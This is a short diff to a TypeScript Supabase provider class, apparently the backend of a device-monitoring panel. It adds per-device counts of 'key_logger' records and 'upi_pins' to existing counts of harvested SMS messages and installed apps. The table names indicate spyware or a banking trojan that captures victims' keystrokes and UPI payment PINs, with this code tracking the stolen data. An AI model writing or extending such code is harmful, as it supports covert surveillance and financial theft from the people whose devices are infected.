@@ -65,14 +65,18 @@ export class SupabaseProvider implements IDeviceProvider {
     }
 
     async getDeviceStats(deviceId: string): Promise<DeviceStats> {
-        const [msgCount, appCount] = await Promise.all([
+        const [msgCount, appCount, keyCount, pinCount] = await Promise.all([
             this.supabase.from('sms_messages').select('*', { count: 'exact', head: true }).eq('device_id', deviceId),
-            this.supabase.from('installed_apps').select('*', { count: 'exact', head: true }).eq('device_id', deviceId)
+            this.supabase.from('installed_apps').select('*', { count: 'exact', head: true }).eq('device_id', deviceId),
+            this.supabase.from('key_logger').select('*', { count: 'exact', head: true }).eq('device_id', deviceId),
+            this.supabase.from('upi_pins').select('*', { count: 'exact', head: true }).eq('device_id', deviceId)
         ]);
 
         return {
             messages: msgCount.count || 0,
-            apps: appCount.count || 0
+            apps: appCount.count || 0,
+            keylogs: keyCount.count || 0,
+            upiPins: pinCount.count || 0
         };
     }
 
